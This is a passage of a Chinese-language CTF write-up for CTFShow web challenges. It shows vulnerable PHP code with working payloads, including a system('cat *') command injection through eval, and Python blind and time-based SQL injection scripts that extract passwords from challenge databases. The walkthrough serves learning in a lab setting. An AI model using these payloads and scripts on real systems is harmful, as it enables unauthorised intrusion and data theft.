    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token comment">//106：if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)   --&gt; v1[]=1 v2[]=2</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>弱比较，和ma5一样，数组绕过，也可以用这个</p>
<pre class="line-numbers language-none"><code class="language-none">aaK1STfY
0e76658526655756207688271159624026011393
aaO8zKZF
0e89257456677279068558073954252716165668<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$error</span><span class="token operator">=</span><span class="token single-quoted-string string">'你还想要flag嘛？'</span><span class="token punctuation">;</span>
<span class="token variable">$suces</span><span class="token operator">=</span><span class="token single-quoted-string string">'既然你想要那给你吧！'</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token single-quoted-string string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//GET不能覆盖error</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//POST值不能为flag</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//不能直接赋值flag=flag</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token double-quoted-string string">"your are good"</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过覆盖suces为flag的值得到flag</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看到<code>foreach</code>就想起来变量覆盖</p>
<blockquote>
<p><code>foreach (array_expression as $key =&gt; $value)</code>键名=&gt;键值</p>
</blockquote>
<h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><p>可以说是变量覆盖的一种?</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p><code>parse_str()</code> –&gt; 将字符串解析成多个变量<br><code>parse_str ( string $encoded_string [, array &amp;$result ] ) : void</code><br>如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。<br>如果未设置 array 参数，则由该函数设置的变量将覆盖已存在的同名变量。<br>PHP 的变量名不能带「点」和「空格」，所以它们会被转化成下划线。 用本函数带 result 参数，也会应用同样规则到数组的键名。<br>php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</p>
</blockquote>
<p>payload:<code>GET:?v3=yq1ng</code> <code>POST: v1=flag=9618785fbf6d1b09b13d336d040f1880</code>(flag值为yq1ng加密md5)</p>
<h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>ereg <span class="token punctuation">(</span><span class="token double-quoted-string string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean constant">FALSE</span><span class="token punctuation">{</span><span class="token comment">//类似 preg_match() ，但 preg_match() 比其更快</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//只有36d的人才能看到flag</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//对c逆序，取整数,0x36d==877</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配<br>payload：<code>?c=a%00778</code></p>
<h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//找到一个内置类，使其不报错且能echo，Exception，ReflectionClass</span>
    <span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>payload:<br><code> ?v1=Exception&amp;v2=system('cat *')</code><br><code>?v1=Reflectionclass&amp;v2=system('cat *')</code></p>
<h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.filesystemiterator.php">filesystemiterator手册</a></p>
<ul>
<li><a target="_blank" rel="noopener" href="http://phpff.com/filesystemiterator">php 快速获取文件夹中文件数量</a>  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$iterator</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilesystemIterator</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span><span class="token punctuation">,</span> FilesystemIterator<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">SKIP_DOTS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//计算迭代器中元素的个数</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"There were %d Files"</span><span class="token punctuation">,</span> <span class="token function">iterator_count</span><span class="token punctuation">(</span><span class="token variable">$iterator</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

</li>
</ul>
<p><code>getcwd()</code> –&gt; 获取当前工作目录 返回当前工作目录<br>payload: <code>?v1=FilesystemIterator&amp;v2=getcwd</code></p>
<h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>补：我回来了，不用脚本，结果没flag关键字就行，right、hex等等直接淦<br><code>$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";</code><br><del>妈的(无能狂怒)，</del> 是盲注，道行太浅一直没想到，脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token string">r'0123456789abcdefghijklmnopqrstuvwxyz-{}'</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string">"http://eaf7f762-c08b-4374-b8d1-396518d73c69.chall.ctf.show/api/v4.php?id="</span>
        payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''1' and substr((select password from ctfshow_user4 where username="flag"),%d,1)="%c"--+'''</span><span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
        <span class="token comment">#print(url+payload)</span>
        <span class="token comment">#print(r.text)</span>
        <span class="token keyword">if</span> <span class="token string">'admin'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><p><code> if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){</code>过滤了所有字符，时间盲注<br>11.18补：群主思路：将查询结果输出到文件，在访问。。。骚<br>payload: <code>1' union select 1,password from ctfshow_user5 where username 'flag' into outfile '/var/wa/html/ctf.txt'-- A</code></p>
<pre class="line-numbers language-py" data-language="py"><code class="language-py"><span class="token comment"># encoding: utf-8</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token triple-quoted-string string">'''http://14e03d71-0f5b-4a4d-b819-884aeb24fbe8.chall.ctf.show/api/v5.php?id=1' '''</span>
flag <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token string">r'{}0123456789abcdefghijklmnopqrstuvwxyz-'</span><span class="token punctuation">:</span>
        <span class="token comment">#开始计时</span>
        before_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string">'and if(substr((select password from ctfshow_user5 where username="flag"),%d,1)="%c",sleep(3),0)--+'</span><span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span> payload<span class="token punctuation">)</span>
        <span class="token comment">#返回时间</span>
        after_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        offset <span class="token operator">=</span> after_time <span class="token operator">-</span> before_time
        <span class="token keyword">if</span> offset <span class="token operator">&gt;</span> <span class="token number">2.8</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="web176-179"><a href="#web176-179" class="headerlink" title="web176-179"></a>web176-179</h2><p>sql：<code>$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";</code><br>waf未知<br>payload：<code>URL/api/?id='or(1)%23</code>通杀</p>
<h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>payload：<code>URL/api/?id='or(mid(username,1,1)='f')and'1'='1</code></p>
<h2 id="web181-182"><a href="#web181-182" class="headerlink" title="web181 | 182"></a>web181 | 182</h2><p>sql语句：<code>$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";</code><br>waf：<code>preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i', $str)</code><br>通杀payload：<code>URL/api/?id='or(mid(username,1,1)='f')and'1'='1</code></p>
<h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>sql：<code>$sql = "select count(pass) from ".$_POST['tableName'].";";</code><br>waf：<code>preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str)</code><br>盲注，一开始用的<code>mid()</code>，数据干扰太多，用了<code>right()</code>，附上*一样的脚本，需要手动停止，没<del>懒得</del>判断嘿嘿</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding: utf-8</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token triple-quoted-string string">'''http://898034b5-dc30-4856-9230-a65688cba1ac.chall.ctf.show/select-waf.php'''</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">}</span>
flag <span class="token operator">=</span> <span class="token string">'}'</span>
s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token string">r'abcdefghijklmnopqrstuvwxyz{-}0123456789'</span><span class="token punctuation">:</span>
        data<span class="token punctuation">[</span><span class="token string">"tableName"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"(ctfshow_user)where(right(pass,%d))like'%s'"</span><span class="token operator">%</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token operator">+</span>flag<span class="token punctuation">)</span>
        <span class="token comment">#print(data)</span>
        s <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        <span class="token comment">#print(s.text)</span>
        <span class="token keyword">if</span> <span class="token string">'$user_count = 1;'</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">=</span> y <span class="token operator">+</span> flag
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><p>sql：<code>$sql = "select count(*) from ".$_POST['tableName'].";";</code><br>waf：<code>preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str)</code><br>emmm，费老牛鼻子劲，太菜了，嘤嘤嘤，第一次用join写脚本，用群主的字典效率高点</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding: utf-8</span>
<span class="token comment"># py2</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token triple-quoted-string string">'''http://e5e91710-3aa2-4752-a2a0-68a6c18fee26.chall.ctf.show/select-waf.php'''</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">}</span>
flag <span class="token operator">=</span> <span class="token string">'flag{'</span>

<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token string">r'abcdefghijklmnopqrstuvwxyz0123456789{-}'</span><span class="token punctuation">:</span>
        <span class="token comment">#字典：flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}   #群主亲传效率高</span>
        temp <span class="token operator">=</span> <span class="token string">"0x"</span><span class="token operator">+</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
        data<span class="token punctuation">[</span><span class="token string">"tableName"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'ctfshow_user x right join ctfshow_user y on left(y.pass,%d) like %s'</span><span class="token operator">%</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>temp<span class="token punctuation">)</span>
        <span class="token comment">#print(data)</span>
        s <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        <span class="token comment">#print(s.text)</span>
        <span class="token keyword">if</span> <span class="token string">'$user_count = 22;'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">=</span>  flag <span class="token operator">+</span> y
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="web185-186"><a href="#web185-186" class="headerlink" title="web185 | 186"></a>web185 | 186</h2><p>185的sql和waf忘了写，不过都是一个脚本，没差<br>186sql：<code>$sql = "select count(*) from ".$_POST['tableName'].";";</code><br>186waf：<code>preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str)</code><br>额，这么慢才出。。。耽搁挺长时间，还是自己太菜了，欸，if的43先自己判断下，系列题目，flag格式固定<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.e8x3axfwwan.png" alt="waf数字"><br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.oys89ez7sjb.png" alt="waf数字字母"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding: utf-8</span>
<span class="token comment"># @Author:  yq1ng</span>
<span class="token comment"># @Date:    2020-11-09 18:30</span>

<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token triple-quoted-string string">'''http://7a27816c-2c96-4544-b3ba-f0867f97f250.chall.ctf.show//select-waf.php'''</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">}</span>
flag <span class="token operator">=</span> <span class="token string">'flag{'</span>
payload <span class="token operator">=</span> <span class="token string">''</span>

